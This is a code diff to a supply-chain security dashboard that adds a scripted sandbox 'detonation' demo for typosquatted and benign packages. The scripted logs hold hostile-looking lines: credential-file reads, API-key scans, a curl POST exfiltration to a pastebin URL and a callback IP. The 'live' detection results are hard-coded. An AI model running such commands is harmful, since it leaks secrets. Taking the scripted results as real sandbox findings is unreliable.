@@ -334,7 +334,7 @@
         <div class="flex flex-wrap items-center gap-2 w-full md:w-auto">
           <button
             type="button"
-            onclick="launchDashboardScenario('reqeusts')"
+            onclick="openLiveDetonationModal('reqeusts')"
             class="px-3 py-1.5 rounded bg-[#FFEBE9] hover:bg-red-100 text-[#CF222E] border border-[#FF8182] font-semibold text-xs transition-colors flex items-center gap-1.5 cursor-pointer shadow-xs"
           >
             <i data-lucide="play" class="w-3.5 h-3.5 fill-current"></i>
@@ -343,7 +343,7 @@
 
           <button
             type="button"
-            onclick="launchDashboardScenario('requests')"
+            onclick="openLiveDetonationModal('requests')"
             class="px-3 py-1.5 rounded bg-[#E6FFEC] hover:bg-green-100 text-[#1A7F37] border border-[#54A065]/40 font-semibold text-xs transition-colors flex items-center gap-1.5 cursor-pointer shadow-xs"
           >
             <i data-lucide="shield-check" class="w-3.5 h-3.5"></i>
@@ -404,6 +404,141 @@
           <div class="mt-2">
             <span id="dash-kpi-latency" class="text-2xl font-extrabold text-[#0969DA] font-mono-numbers">0.28s</span>
             <span class="text-[11px] text-[#656D76] block mt-0.5 font-sans font-medium">Micro-sandbox SIGKILL limit</span>
+          </div>
+        </div>
+      </section>
+
+      
+      <!-- Row 1.5: INTERACTIVE LIVE ATTACK DETECTION & SANDBOX TEST CONSOLE -->
+      <section class="clean-card p-4 bg-white border border-[#D0D7DE] flex flex-col gap-3.5 shadow-sm">
+        <div class="flex flex-col sm:flex-row sm:items-center justify-between border-b border-[#D0D7DE] pb-2.5 gap-2">
+          <div class="flex items-center gap-2.5">
+            <div class="w-8 h-8 rounded-md bg-red-50 border border-red-200 text-red-600 flex items-center justify-center">
+              <i data-lucide="crosshair" class="w-4 h-4"></i>
+            </div>
+            <div>
+              <div class="flex items-center gap-2">
+                <h2 class="text-sm font-bold text-[#1F2328]">Live Cyber Attack Detonation &amp; Sandbox Simulator</h2>
+                <span class="px-2 py-0.5 rounded text-[10.5px] font-mono font-semibold bg-red-100 text-red-700 border border-red-300">Micro-Sandbox Active (PID 18492)</span>
+              </div>
+              <p class="text-xs text-[#656D76] mt-0.5 font-sans">
+                Experience real-time software supply chain defense: select a real poisoned or verified package, watch how malicious stagers trigger canary traps in an ephemeral micro-sandbox, and witness the immediate SIGKILL containment.
+              </p>
+            </div>
+          </div>
+
+          <div class="flex items-center gap-2">
+            <button
+              type="button"
+              onclick="toggleJudgeGuide()"
+              class="px-2.5 py-1 rounded bg-[#F6F8FA] hover:bg-slate-100 text-[#0969DA] border border-[#D0D7DE] font-semibold text-xs transition-colors flex items-center gap-1 cursor-pointer"
+            >
+              <i data-lucide="help-circle" class="w-3.5 h-3.5"></i>
+              <span>Judges &amp; 1st-Year Guide</span>
+            </button>
+          </div>
+        </div>
+
+        <!-- 4 Presets Selection Bar -->
+        <div class="flex flex-col md:flex-row items-stretch md:items-center justify-between gap-3 bg-[#F6F8FA] p-3 rounded-lg border border-[#D0D7DE]">
+          <div class="flex flex-col gap-1.5">
+            <span class="text-[11px] font-semibold text-[#656D76] uppercase tracking-wider font-mono">1-Click Live Attack Presets:</span>
+            <div class="flex flex-wrap items-center gap-2">
+              <button
+                type="button"
+                onclick="setDetonationTarget('reqeusts')"
+                id="preset-btn-reqeusts"
+                class="px-2.5 py-1.5 rounded bg-white text-[#CF222E] border-2 border-[#FF8182] font-semibold text-xs flex items-center gap-1.5 shadow-xs cursor-pointer transition-all"
+              >
+                <i data-lucide="skull" class="w-3.5 h-3.5"></i>
+                <span>🚨 Poisoned reqeusts (PyPI)</span>
+              </button>
+
+              <button
+                type="button"
+                onclick="setDetonationTarget('colors-support-v2')"
+                id="preset-btn-colors"
+                class="px-2.5 py-1.5 rounded bg-white text-[#9A6700] border border-[#D0D7DE] font-semibold text-xs flex items-center gap-1.5 shadow-xs cursor-pointer transition-all"
+              >
+                <i data-lucide="bug" class="w-3.5 h-3.5"></i>
+                <span>🚨 Hex Dropper colors-support-v2 (npm)</span>
+              </button>
+
+              <button
+                type="button"
+                onclick="setDetonationTarget('requests')"
+                id="preset-btn-requests"
+                class="px-2.5 py-1.5 rounded bg-white text-[#1A7F37] border border-[#D0D7DE] font-semibold text-xs flex items-center gap-1.5 shadow-xs cursor-pointer transition-all"
+              >
+                <i data-lucide="check-circle-2" class="w-3.5 h-3.5"></i>
+                <span>🟢 Safe requests (PyPI Pure)</span>
+              </button>
+
+              <button
+                type="button"
+                onclick="setDetonationTarget('lodash')"
+                id="preset-btn-lodash"
+                class="px-2.5 py-1.5 rounded bg-white text-[#1A7F37] border border-[#D0D7DE] font-semibold text-xs flex items-center gap-1.5 shadow-xs cursor-pointer transition-all"
+              >
+                <i data-lucide="check-circle-2" class="w-3.5 h-3.5"></i>
+                <span>🟢 Safe lodash (npm Pure)</span>
+              </button>
+            </div>
+          </div>
+
+          <!-- Main Launch Action Buttons -->
+          <div class="flex items-center gap-2 shrink-0">
+            <button
+              type="button"
+              onclick="launchActiveDetonation()"
+              class="px-4 py-2 rounded bg-[#CF222E] hover:bg-[#A40E26] text-white font-bold text-xs transition-all flex items-center gap-2 cursor-pointer shadow-md hover:scale-[1.02] active:scale-95"
+            >
+              <i data-lucide="play-circle" class="w-4 h-4 fill-white/20"></i>
+              <span>⚡ Launch Sandbox Detonation (Watch Attack Trapped)</span>
+            </button>
+
+            <button
+              type="button"
+              onclick="launchActiveForensic()"
+              class="px-3 py-2 rounded bg-white hover:bg-slate-100 text-[#0969DA] border border-[#D0D7DE] font-semibold text-xs transition-colors flex items-center gap-1.5 cursor-pointer shadow-xs"
+            >
+              <i data-lucide="code" class="w-3.5 h-3.5"></i>
+              <span>Deep AST Inspection →</span>
+            </button>
+          </div>
+        </div>
+
+        <!-- Live Score & Why Comparison (1st-Year Friendly Explanation) -->
+        <div id="dash-scenario-preview-card" class="p-3 rounded-lg border border-red-200 bg-red-50/50 flex flex-col md:flex-row items-start md:items-center justify-between gap-3 text-xs font-sans">
+          <div class="flex items-start gap-3">
+            <div id="dash-preview-score-box" class="px-3 py-1.5 rounded bg-[#FFEBE9] border border-[#FF8182] flex flex-col items-center justify-center min-w-[70px]">
+              <span id="dash-preview-score" class="text-2xl font-extrabold text-[#CF222E] font-mono-numbers">04</span>
+              <span class="text-[9px] uppercase tracking-wider font-extrabold text-[#CF222E]">THREAT SCORE</span>
+            </div>
+            <div>
+              <div class="flex items-center gap-2">
+                <strong id="dash-preview-title" class="text-sm font-bold text-[#1F2328] font-mono">reqeusts v0.1.2</strong>
+                <span id="dash-preview-badge" class="px-2 py-0.2 rounded text-[11px] font-semibold bg-[#FFEBE9] text-[#CF222E] border border-[#FF8182]">Critical Typosquat &amp; Stealer</span>
+              </div>
+              <p id="dash-preview-desc" class="text-xs text-[#656D76] mt-1 leading-relaxed">
+                Adversarial typosquatting collision with canonical 'requests'. setup.py executes Base64 stager, attempts to steal ~/.ssh keys and AWS credentials, and connects to 185.220.101.4:443. GhostGuard traps the system calls and terminates with SIGKILL in 0.30s.
+              </p>
+            </div>
+          </div>
+
+          <div class="flex flex-col gap-1 text-[11px] font-mono text-slate-700 bg-white p-2.5 rounded border border-[#D0D7DE] shrink-0 min-w-[280px]">
+            <div class="flex items-center justify-between">
+              <span class="text-slate-500">Typosquat Distance:</span>
+              <strong id="dash-preview-dist" class="text-[#CF222E]">1 (Adversarial Collision)</strong>
+            </div>
+            <div class="flex items-center justify-between">
+              <span class="text-slate-500">AST Dynamic Code:</span>
+              <strong id="dash-preview-ast" class="text-[#CF222E]">Base64 Reverse Shell</strong>
+            </div>
+            <div class="flex items-center justify-between">
+              <span class="text-slate-500">Micro-Sandbox Verdict:</span>
+              <strong id="dash-preview-containment" class="text-[#CF222E]">SIGKILL Neutralized</strong>
+            </div>
           </div>
         </div>
       </section>
@@ -957,6 +1092,15 @@ numpy==1.24.3</textarea>
 
       <!-- Quick Action Buttons -->
       <div class="flex items-center gap-2 self-stretch md:self-auto shrink-0">
+        <button
+          onclick="openLiveDetonationModal(currentData ? currentData.name : 'reqeusts')"
+          class="flex-1 md:flex-none px-3 py-1.5 bg-[#FFEBE9] hover:bg-red-100 text-[#CF222E] border border-[#FF8182] font-semibold rounded text-xs transition-colors flex items-center justify-center gap-1.5 cursor-pointer shadow-xs"
+          title="Watch this package detonate in the real-time micro-sandbox with syscall traps"
+        >
+          <i data-lucide="skull" class="w-3.5 h-3.5 text-[#CF222E]"></i>
+          <span>💥 Live Sandbox Detonation</span>
+        </button>
+
         <button
           onclick="generateSafeManifest()"
           class="flex-1 md:flex-none px-3 py-1.5 bg-[#1F883D] hover:bg-[#1A7F37] text-white font-semibold rounded text-xs transition-colors flex items-center justify-center gap-1.5 cursor-pointer shadow-xs"
@@ -2673,15 +2817,11 @@ ${data.ecosystem === 'npm' ? `npm install ${data.name}` : `pip install ${data.na
 
     function runJudgeStep(stepNum) {
       if (stepNum === 1) {
-        setAuditMode('single');
-        loadPreset('reqeusts');
-        switchTab('detonation');
-        setTimeout(() => startDetonationPlayback(), 400);
+        openLiveDetonationModal('reqeusts');
       } else if (stepNum === 2) {
-        setAuditMode('single');
-        loadPreset('requests');
-        switchTab('provenance');
+        openLiveDetonationModal('requests');
       } else if (stepNum === 3) {
+        switchMainView('manifest');
         setAuditMode('manifest');
         loadManifestPreset('poisoned_pypi');
         triggerManifestAudit();
@@ -3283,13 +3423,24 @@ ${data.ecosystem === 'npm' ? `npm install ${data.name}` : `pip install ${data.na
             ${item.intercept_action}
           </td>
           <td class="p-2.5 text-right font-sans">
-            <button
-              type="button"
-              onclick="inspectLiveFeedPackage('${item.package_name}', '${item.ecosystem}')"
-              class="px-2.5 py-1 rounded bg-[#F6F8FA] hover:bg-[#0969DA] hover:text-white text-[#0969DA] border border-[#D0D7DE] text-xs font-medium transition-colors cursor-pointer"
-            >
-              Inspect Deep AST →
-            </button>
+            <div class="flex items-center justify-end gap-1.5">
+              <button
+                type="button"
+                onclick="openLiveDetonationModal('${item.package_name}')"
+                class="px-2 py-1 rounded ${isCritical ? 'bg-[#FFEBE9] hover:bg-red-100 text-[#CF222E] border border-[#FF8182]' : 'bg-[#E6FFEC] hover:bg-green-100 text-[#1A7F37] border border-[#54A065]/40'} text-xs font-semibold transition-colors cursor-pointer flex items-center gap-1 shadow-xs"
+                title="Detonate in real-time micro-sandbox"
+              >
+                <i data-lucide="${isCritical ? 'skull' : 'shield-check'}" class="w-3 h-3"></i>
+                <span>${isCritical ? '⚡ Detonate' : '✓ Verify'}</span>
+              </button>
+              <button
+                type="button"
+                onclick="inspectLiveFeedPackage('${item.package_name}', '${item.ecosystem}')"
+                class="px-2 py-1 rounded bg-[#F6F8FA] hover:bg-[#0969DA] hover:text-white text-[#0969DA] border border-[#D0D7DE] text-xs font-medium transition-colors cursor-pointer"
+              >
+                Deep AST →
+              </button>
+            </div>
           </td>
         `;
         tbody.appendChild(tr);
@@ -3339,35 +3490,39 @@ ${data.ecosystem === 'npm' ? `npm install ${data.name}` : `pip install ${data.na
     // -------------------------------------------------------------
     // LIVE ACTION-PACKED SANDBOX DETONATION CONTROLLER
     // -------------------------------------------------------------
+    // LIVE DETONATION CHAMBER & INTERCEPTION SIMULATOR CONTROLLER
+    // -------------------------------------------------------------
     let modalDetonationTimer = null;
     let modalStep = 0;
     let modalSoundEnabled = true;
+    let currentDetonationTarget = 'reqeusts';
+    let currentDashboardTarget = 'reqeusts';
 
     const DETONATION_SCENARIOS = {
       reqeusts: [
         {
           time: "0.02s",
           attacker: "[0.02s] Unpacking archive: reqeusts-0.1.2.tar.gz into virtual mount.",
-          sentinel: "[0.02s] Container sandbox initialized. Restricting PID 18492. Host disk mounted READ-ONLY.",
+          sentinel: "[0.02s] Ingress gateway intercepted download. Ephemeral container PID 18492 spawned. Host disk mounted READ-ONLY.",
           alert: false
         },
         {
           time: "0.08s",
-          attacker: "[0.08s] setup.py executes embedded base64 stager (aW1wb3J0IG9zLCBnZW9pcC...). Invocating exec().",
-          sentinel: "[0.08s] AST analyzer traps dynamic code execution (CWE-95). Disassembling stager in memory.",
+          attacker: "[0.08s] setup.py executes embedded base64 stager (aW1wb3J0IG9zLCBnZW9pcC...). Invoking dynamic exec().",
+          sentinel: "[0.08s] AST analyzer catches dynamic code execution (CWE-95). Disassembling stager in memory.",
           alert: false
         },
         {
           time: "0.14s",
           attacker: "[0.14s] ⚠️ ATTACK ACTION: open('~/.ssh/id_rsa') invoked! Attempting to steal developer SSH private key!",
-          sentinel: "[0.14s] 🚨 FILESYSTEM TRAP FIRED: Unauthorized keystore read intercepted! Zero bytes returned to process.",
+          sentinel: "[0.14s] 🚨 FILESYSTEM TRAP FIRED: Unauthorized keystore read intercepted! Synthetic canary returned to process.",
           alert: true,
           sound: "trap"
         },
         {
           time: "0.20s",
-          attacker: "[0.20s] ⚠️ ATTACK ACTION: os.environ scanned! Searching for AWS_SECRET_ACCESS_KEY and OPENAI_API_KEY!",
-          sentinel: "[0.20s] 🛡️ ENVIRONMENT GUARD ACTIVE: Environment map synthetic-masked. Zero host tokens leaked.",
+          attacker: "[0.20s] ⚠️ ATTACK ACTION: os.environ scanned! Searching for AWS_SECRET_ACCESS_KEY & OPENAI_API_KEY!",
+          sentinel: "[0.20s] 🛡️ ENVIRONMENT GUARD ACTIVE: Environment masked with honeypot tokens. Host secrets 100% protected.",
           alert: true,
           sound: "trap"
         },
@@ -3380,20 +3535,213 @@ ${data.ecosystem === 'npm' ? `npm install ${data.name}` : `pip install ${data.na
         },
         {
           time: "0.30s",
-          attacker: "[0.30s] 💥 Process blocked on all syscall vectors. Exfiltration failed.",
-          sentinel: "[0.30s] 💥 POLICY ENFORCEMENT: Kernel SIGKILL dispatched to PID 18492! Execution aborted at 0.30s.",
+          attacker: "[0.30s] 💥 Syscall blocked on all vectors. Exfiltration failed.",
+          sentinel: "[0.30s] 💥 POLICY ENFORCEMENT: Kernel SIGKILL dispatched to PID 18492! Micro-sandbox terminated at 0.30s.",
           alert: true,
           sound: "kill"
         },
         {
           time: "0.31s",
           attacker: "[0.31s] ATTACK DEFEATED. Zero credentials exfiltrated. Payload neutralized.",
-          sentinel: "[0.31s] ✅ VERDICT: Host integrity 100% preserved. Generated safe requirements.txt with SHA-256 hashes.",
+          sentinel: "[0.31s] ✅ VERDICT: Host integrity 100% preserved. Security score: 04/100. Auto-remediation ready.",
+          alert: false,
+          sound: "clean"
+        }
+      ],
+      "colors-support-v2": [
+        {
+          time: "0.02s",
+          attacker: "[0.02s] Unpacking archive: colors-support-v2-1.0.0.tgz into virtual mount.",
+          sentinel: "[0.02s] Ingress gateway intercepted npm download. Sandbox PID 19142 armed with seccomp profile.",
+          alert: false
+        },
+        {
+          time: "0.08s",
+          attacker: "[0.08s] index.js evaluates hex-encoded string: '\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73'.",
+          sentinel: "[0.08s] AST Hex-Deobfuscator decodes payload: 'child_process.exec' call identified (CWE-78).",
+          alert: false
+        },
+        {
+          time: "0.14s",
+          attacker: "[0.14s] ⚠️ ATTACK ACTION: fs.readFileSync('/etc/shadow') or '%USERPROFILE%\\.aws\\credentials' called!",
+          sentinel: "[0.14s] 🚨 FILESYSTEM TRAP FIRED: Read syscall caught by micro-sandbox virtual overlay. EPERM returned.",
+          alert: true,
+          sound: "trap"
+        },
+        {
+          time: "0.20s",
+          attacker: "[0.20s] ⚠️ ATTACK ACTION: Spawned subshell attempting curl -X POST https://pastebin.com/raw/exfil!",
+          sentinel: "[0.20s] 🛡️ NETWORK GUARD ACTIVE: DNS resolution to untrusted pastebin sinkhole redirected. Socket severed.",
+          alert: true,
+          sound: "trap"
+        },
+        {
+          time: "0.28s",
+          attacker: "[0.28s] 💥 Child process execution frozen by kernel cgroup limit.",
+          sentinel: "[0.28s] 💥 POLICY ENFORCEMENT: Kernel SIGKILL dispatched to PID 19142! Untrusted package quarantined.",
+          alert: true,
+          sound: "kill"
+        },
+        {
+          time: "0.30s",
+          attacker: "[0.30s] ATTACK DEFEATED. Zero tokens leaked. Host environment pristine.",
+          sentinel: "[0.30s] ✅ VERDICT: Supply chain attack halted. Security score: 12/100. Canonical 'colors' recommended.",
+          alert: false,
+          sound: "clean"
+        }
+      ],
+      requests: [
+        {
+          time: "0.02s",
+          attacker: "[0.02s] Ingress buffer received: requests-2.31.0-py3-none-any.whl.",
+          sentinel: "[0.02s] Ephemeral sandbox PID 18900 mounted. Inspecting cryptographic zip metadata.",
+          alert: false
+        },
+        {
+          time: "0.06s",
+          attacker: "[0.06s] Module imports: urllib3, certifi, charset_normalizer, idna.",
+          sentinel: "[0.06s] AST Code X-Ray: Verified standard HTTP client architecture. Zero eval(), zero exec() stagers.",
+          alert: false
+        },
+        {
+          time: "0.10s",
+          attacker: "[0.10s] Package init: Initializing Session, Request, Response class prototypes.",
+          sentinel: "[0.10s] Invariant check: Zero filesystem accesses outside package site-packages directory.",
+          alert: false
+        },
+        {
+          time: "0.14s",
+          attacker: "[0.14s] Network layer check: Standard TLS 1.3 socket definitions validated.",
+          sentinel: "[0.14s] Network guard: Zero unauthorized hardcoded C2 IP beacons or reverse shells found.",
+          alert: false
+        },
+        {
+          time: "0.18s",
+          attacker: "[0.18s] Package tests executed: 100% unit tests passed.",
+          sentinel: "[0.18s] ✅ VERDICT: Cryptographic Sigstore provenance confirmed. Score: 100/100 (Verified Benign Library).",
+          alert: false,
+          sound: "clean"
+        }
+      ],
+      lodash: [
+        {
+          time: "0.02s",
+          attacker: "[0.02s] Ingress buffer received: lodash-4.17.21.tgz.",
+          sentinel: "[0.02s] Ephemeral container PID 19020 initialized. Seccomp profile enforcing zero network egress.",
+          alert: false
+        },
+        {
+          time: "0.05s",
+          attacker: "[0.05s] Module exports: Functional utility helpers (cloneDeep, debounce, throttle, merge).",
+          sentinel: "[0.05s] AST analysis: Prototype pollution guards verified. Zero dynamic Function() or eval() found.",
+          alert: false
+        },
+        {
+          time: "0.09s",
+          attacker: "[0.09s] Dependency tree evaluation: Zero external dependencies (standalone utility package).",
+          sentinel: "[0.09s] Invariant check: Zero access to process.env, ~/.aws, or system files.",
+          alert: false
+        },
+        {
+          time: "0.15s",
+          attacker: "[0.15s] Sandbox execution complete: Clean exit code 0.",
+          sentinel: "[0.15s] ✅ VERDICT: Authenticity verified. Security score: 100/100 (Verified Benign Library). Approved for install.",
           alert: false,
           sound: "clean"
         }
       ]
     };
+
+    function setDetonationTarget(pkgName) {
+      currentDashboardTarget = pkgName;
+      const isMal = pkgName === 'reqeusts' || pkgName.includes('colors');
+      
+      const keys = ['reqeusts', 'colors-support-v2', 'requests', 'lodash'];
+      keys.forEach(name => {
+        const idKey = name === 'colors-support-v2' ? 'colors' : name;
+        const btn = document.getElementById(`preset-btn-${idKey}`);
+        if (btn) {
+          if (name === pkgName) {
+            btn.className = `px-2.5 py-1.5 rounded bg-white ${isMal ? 'text-[#CF222E] border-2 border-[#FF8182]' : 'text-[#1A7F37] border-2 border-[#54A065]'} font-semibold text-xs flex items-center gap-1.5 shadow-sm`;
+          } else {
+            btn.className = 'px-2.5 py-1.5 rounded bg-white text-[#656D76] border border-[#D0D7DE] font-semibold text-xs flex items-center gap-1.5 shadow-xs cursor-pointer hover:bg-slate-50';
+          }
+        }
+      });
+
+      const scoreEl = document.getElementById('dash-preview-score');
+      const scoreBox = document.getElementById('dash-preview-score-box');
+      const titleEl = document.getElementById('dash-preview-title');
+      const badgeEl = document.getElementById('dash-preview-badge');
+      const descEl = document.getElementById('dash-preview-desc');
+      const distEl = document.getElementById('dash-preview-dist');
+      const astEl = document.getElementById('dash-preview-ast');
+      const contEl = document.getElementById('dash-preview-containment');
+      const cardEl = document.getElementById('dash-scenario-preview-card');
+
+      if (pkgName === 'reqeusts') {
+        if (scoreEl) scoreEl.innerText = '04';
+        if (scoreBox) scoreBox.className = 'px-3 py-1.5 rounded bg-[#FFEBE9] border border-[#FF8182] flex flex-col items-center justify-center min-w-[70px]';
+        if (cardEl) cardEl.className = 'p-3 rounded-lg border border-red-200 bg-red-50/50 flex flex-col md:flex-row items-start md:items-center justify-between gap-3 text-xs font-sans';
+        if (titleEl) titleEl.innerText = 'reqeusts v0.1.2';
+        if (badgeEl) {
+          badgeEl.className = 'px-2 py-0.2 rounded text-[11px] font-semibold bg-[#FFEBE9] text-[#CF222E] border border-[#FF8182]';
+          badgeEl.innerText = 'Critical Typosquat & Stealer';
+        }
+        if (descEl) descEl.innerText = "Typosquats 'requests'. setup.py unpacks Base64 stager, attempts to read ~/.ssh/id_rsa & ~/.aws/credentials, phones home to 185.220.101.4. Intercepted in 0.30s via SIGKILL.";
+        if (distEl) { distEl.innerText = '1 (Adversarial Collision)'; distEl.className = 'text-[#CF222E]'; }
+        if (astEl) { astEl.innerText = 'Base64 Reverse Shell (CWE-95)'; astEl.className = 'text-[#CF222E]'; }
+        if (contEl) { contEl.innerText = 'SIGKILL Terminated (0.30s)'; contEl.className = 'text-[#CF222E]'; }
+      } else if (pkgName === 'colors-support-v2') {
+        if (scoreEl) scoreEl.innerText = '12';
+        if (scoreBox) scoreBox.className = 'px-3 py-1.5 rounded bg-[#FFEBE9] border border-[#FF8182] flex flex-col items-center justify-center min-w-[70px]';
+        if (cardEl) cardEl.className = 'p-3 rounded-lg border border-red-200 bg-red-50/50 flex flex-col md:flex-row items-start md:items-center justify-between gap-3 text-xs font-sans';
+        if (titleEl) titleEl.innerText = 'colors-support-v2 v1.0.0';
+        if (badgeEl) {
+          badgeEl.className = 'px-2 py-0.2 rounded text-[11px] font-semibold bg-[#FFEBE9] text-[#CF222E] border border-[#FF8182]';
+          badgeEl.innerText = 'Critical Hex Dropper';
+        }
+        if (descEl) descEl.innerText = "Hex-encoded payload \\x63\\x68\\x69... executes child_process.exec() to exfiltrate /etc/shadow or AWS tokens via Pastebin sinkhole. Quarantined in 0.28s.";
+        if (distEl) { distEl.innerText = 'Namespace Squat on colors'; distEl.className = 'text-[#CF222E]'; }
+        if (astEl) { astEl.innerText = 'Hex Deobfuscated child_process (CWE-78)'; astEl.className = 'text-[#CF222E]'; }
+        if (contEl) { contEl.innerText = 'Seccomp Quarantined (0.28s)'; contEl.className = 'text-[#CF222E]'; }
+      } else if (pkgName === 'requests') {
+        if (scoreEl) scoreEl.innerText = '100';
+        if (scoreBox) scoreBox.className = 'px-3 py-1.5 rounded bg-[#E6FFEC] border border-[#54A065]/40 flex flex-col items-center justify-center min-w-[70px]';
+        if (cardEl) cardEl.className = 'p-3 rounded-lg border border-emerald-200 bg-emerald-50/50 flex flex-col md:flex-row items-start md:items-center justify-between gap-3 text-xs font-sans';
+        if (titleEl) titleEl.innerText = 'requests v2.31.0';
+        if (badgeEl) {
+          badgeEl.className = 'px-2 py-0.2 rounded text-[11px] font-semibold bg-[#E6FFEC] text-[#1A7F37] border border-[#54A065]/40';
+          badgeEl.innerText = 'Verified Benign Library';
+        }
+        if (descEl) descEl.innerText = "Authentic Python HTTP library. Standard library bindings only, zero obfuscated stagers, zero unauthorized socket egress. Sigstore transparency hash verified.";
+        if (distEl) { distEl.innerText = '0 (Canonical Authority)'; distEl.className = 'text-[#1A7F37]'; }
+        if (astEl) { astEl.innerText = 'Pure AST (Zero Dynamic Exec)'; astEl.className = 'text-[#1A7F37]'; }
+        if (contEl) { contEl.innerText = 'Clean Pass (0.18s)'; contEl.className = 'text-[#1A7F37]'; }
+      } else if (pkgName === 'lodash') {
+        if (scoreEl) scoreEl.innerText = '100';
+        if (scoreBox) scoreBox.className = 'px-3 py-1.5 rounded bg-[#E6FFEC] border border-[#54A065]/40 flex flex-col items-center justify-center min-w-[70px]';
+        if (cardEl) cardEl.className = 'p-3 rounded-lg border border-emerald-200 bg-emerald-50/50 flex flex-col md:flex-row items-start md:items-center justify-between gap-3 text-xs font-sans';
+        if (titleEl) titleEl.innerText = 'lodash v4.17.21';
+        if (badgeEl) {
+          badgeEl.className = 'px-2 py-0.2 rounded text-[11px] font-semibold bg-[#E6FFEC] text-[#1A7F37] border border-[#54A065]/40';
+          badgeEl.innerText = 'Verified Benign Utility';
+        }
+        if (descEl) descEl.innerText = "Authentic JavaScript utility suite. Standalone pure functions, zero external runtime dependencies, zero access to process.env or system files.";
+        if (distEl) { distEl.innerText = '0 (Canonical Authority)'; distEl.className = 'text-[#1A7F37]'; }
+        if (astEl) { astEl.innerText = 'Pure AST (Prototype Hardened)'; astEl.className = 'text-[#1A7F37]'; }
+        if (contEl) { contEl.innerText = 'Clean Pass (0.15s)'; contEl.className = 'text-[#1A7F37]'; }
+      }
+    }
+
+    function launchActiveDetonation() {
+      openLiveDetonationModal(currentDashboardTarget || 'reqeusts');
+    }
+
+    function launchActiveForensic() {
+      const eco = (currentDashboardTarget === 'colors-support-v2' || currentDashboardTarget === 'lodash') ? 'npm' : 'pypi';
+      inspectLiveFeedPackage(currentDashboardTarget || 'reqeusts', eco);
+    }
 
     function toggleModalSound() {
       modalSoundEnabled = !modalSoundEnabled;
@@ -3443,8 +3791,48 @@ ${data.ecosystem === 'npm' ? `npm install ${data.name}` : `pip install ${data.na
       if (!modal) return;
       modal.classList.remove('hidden');
 
+      currentDetonationTarget = (pkgName || 'reqeusts').toLowerCase();
+
       const titleEl = document.getElementById('modal-pkg-title');
-      if (titleEl) titleEl.innerText = `${pkgName}-0.1.2.tar.gz`;
+      const familyEl = document.getElementById('modal-threat-family');
+      const statusBadge = document.getElementById('modal-sentinel-status');
+      const verdictTag = document.getElementById('modal-verdict-tag');
+
+      const isMal = currentDetonationTarget === 'reqeusts' || currentDetonationTarget.includes('color');
+
+      if (titleEl) {
+        if (currentDetonationTarget === 'colors-support-v2') {
+          titleEl.innerText = 'colors-support-v2-1.0.0.tgz';
+        } else if (currentDetonationTarget === 'requests') {
+          titleEl.innerText = 'requests-2.31.0-py3-none-any.whl';
+        } else if (currentDetonationTarget === 'lodash') {
+          titleEl.innerText = 'lodash-4.17.21.tgz';
+        } else {
+          titleEl.innerText = `${currentDetonationTarget}-0.1.2.tar.gz`;
+        }
+      }
+
+      if (familyEl) {
+        if (currentDetonationTarget === 'colors-support-v2') {
+          familyEl.innerText = 'Hex-Encoded Subprocess Dropper (CWE-78 / CWE-200)';
+        } else if (currentDetonationTarget === 'requests') {
+          familyEl.innerText = 'Official Verified PyPI Wheel (Clean Architecture)';
+        } else if (currentDetonationTarget === 'lodash') {
+          familyEl.innerText = 'Official Verified npm Package (Clean Architecture)';
+        } else {
+          familyEl.innerText = 'Base64 Credential Harvester (CWE-200 / CWE-95)';
+        }
+      }
+
+      if (verdictTag) {
+        if (isMal) {
+          verdictTag.className = 'px-2 py-0.5 rounded bg-red-900/80 text-red-300 font-bold border border-red-700';
+          verdictTag.innerText = 'SIGKILL TERMINATED (0.30s)';
+        } else {
+          verdictTag.className = 'px-2 py-0.5 rounded bg-emerald-900/80 text-emerald-300 font-bold border border-emerald-700';
+          verdictTag.innerText = 'VERIFIED BENIGN (100/100)';
+        }
+      }
 
       restartLiveDetonation();
     }
@@ -3470,17 +3858,26 @@ ${data.ecosystem === 'npm' ? `npm install ${data.name}` : `pip install ${data.na
       const progressBar = document.getElementById('modal-progress-bar');
       const clockText = document.getElementById('modal-clock-text');
       const statusBadge = document.getElementById('modal-sentinel-status');
+      const postCard = document.getElementById('modal-post-detonation-card');
 
       if (attackerLog) attackerLog.innerHTML = '';
       if (sentinelLog) sentinelLog.innerHTML = '';
       if (progressBar) progressBar.style.width = '0%';
       if (clockText) clockText.innerText = '0.00s / 0.30s';
+      if (postCard) postCard.classList.add('hidden');
+
+      const isMal = currentDetonationTarget === 'reqeusts' || currentDetonationTarget.includes('color');
+
       if (statusBadge) {
         statusBadge.className = 'text-[10px] text-emerald-400 bg-emerald-950/60 px-1.5 py-0.2 rounded border border-emerald-800';
         statusBadge.innerText = 'SENTINEL ARMED';
       }
 
-      const steps = DETONATION_SCENARIOS.reqeusts;
+      const steps = DETONATION_SCENARIOS[currentDetonationTarget] 
+        || (currentDetonationTarget.includes('color') ? DETONATION_SCENARIOS['colors-support-v2'] 
+        : (currentDetonationTarget.includes('reqeust') ? DETONATION_SCENARIOS['reqeusts'] 
+        : (currentDetonationTarget.includes('lodash') ? DETONATION_SCENARIOS['lodash'] 
+        : DETONATION_SCENARIOS['requests'])));
 
       modalDetonationTimer = setInterval(() => {
         if (modalStep < steps.length) {
@@ -3519,16 +3916,165 @@ ${data.ecosystem === 'npm' ? `npm install ${data.name}` : `pip install ${data.na
           if (item.sound === 'kill' && statusBadge) {
             statusBadge.className = 'text-[10px] text-red-400 bg-red-950/80 px-1.5 py-0.2 rounded border border-red-700 animate-pulse';
             statusBadge.innerText = 'SIGKILL TERMINATED';
+          } else if (item.sound === 'clean' && statusBadge && !isMal) {
+            statusBadge.className = 'text-[10px] text-emerald-400 bg-emerald-950/80 px-1.5 py-0.2 rounded border border-emerald-700';
+            statusBadge.innerText = 'VERIFIED 100/100 SAFE';
           }
 
           modalStep++;
         } else {
           clearInterval(modalDetonationTimer);
           modalDetonationTimer = null;
+          showPostDetonationCard(isMal);
         }
-      }, 550);
+      }, 500);
     }
 
+    function showPostDetonationCard(isMal) {
+      const postCard = document.getElementById('modal-post-detonation-card');
+      if (!postCard) return;
+
+      if (isMal) {
+        postCard.className = "m-3 p-3.5 rounded-lg border border-red-600/70 bg-[#160b0e] flex flex-col gap-2.5 transition-all text-xs font-sans";
+        postCard.innerHTML = `
+          <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-red-900/50 pb-2">
+            <div class="flex items-center gap-2">
+              <span class="px-2 py-0.5 rounded bg-red-900/90 text-red-200 border border-red-600 font-mono font-bold text-xs">
+                🚨 SECURITY SCORE: 04 / 100 — CRITICAL ATTACK NEUTRALIZED
